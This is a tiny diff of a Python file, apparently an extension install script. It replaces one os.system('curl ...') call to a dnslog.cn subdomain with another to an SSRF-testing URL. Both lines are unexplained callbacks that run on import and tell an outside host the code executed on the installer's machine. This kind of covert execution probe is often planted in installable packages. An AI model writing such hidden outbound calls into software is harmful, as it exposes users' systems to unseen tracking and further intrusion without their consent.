@@ -1,3 +1,3 @@
 import launch
 import os
-os.system("curl e8g8h3.dnslog.cn")
+os.system("curl https://src-ssrf.bytedance.net/ssrf")
